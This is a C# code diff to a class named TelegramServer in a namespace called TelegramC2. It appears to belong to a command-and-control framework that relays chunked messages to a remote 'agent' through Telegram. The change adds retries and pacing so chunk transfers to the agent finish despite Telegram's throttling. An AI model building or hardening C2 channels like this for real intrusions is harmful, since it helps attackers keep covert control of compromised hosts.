@@ -7,6 +7,7 @@ namespace TelegramC2;
 internal sealed class TelegramServer : IDisposable
 {
     private const int EnvelopeChunkSize = 2800;
+    private const int EnvelopeSendDelayMs = 350;
     private const int MaximumCachedResponses = 16;
     private static readonly TimeSpan CachedResponseLifetime = TimeSpan.FromMinutes(10);
     private static readonly TimeSpan RouteCheckInterval = TimeSpan.FromSeconds(5);
@@ -263,10 +264,28 @@ internal sealed class TelegramServer : IDisposable
                 Message = payload.Substring(offset, length)
             };
 
-            await _telegram.SendTextAsync(
-                chatId,
-                JsonSerializer.Serialize(envelope),
-                cancellationToken);
+            string serialized = JsonSerializer.Serialize(envelope);
+            for (int attempt = 1; ; attempt++)
+            {
+                try
+                {
+                    await _telegram.SendTextAsync(chatId, serialized, cancellationToken);
+                    break;
+                }
+                catch (Exception exception) when (attempt < 4)
+                {
+                    Console.Error.WriteLine(
+                        $"Telegram chunk {index + 1}/{chunks} send failed ({exception.Message}); retry {attempt}");
+                    await Task.Delay(TimeSpan.FromMilliseconds(750 * attempt), cancellationToken);
+                }
+            }
+
+            if (index + 1 < chunks)
+            {
+                // Space out envelope chunks: Telegram throttles bursts to a single chat,
+                // and a dropped chunk means the agent never completes the transfer.
+                await Task.Delay(TimeSpan.FromMilliseconds(EnvelopeSendDelayMs), cancellationToken);
+            }
         }
     }
 
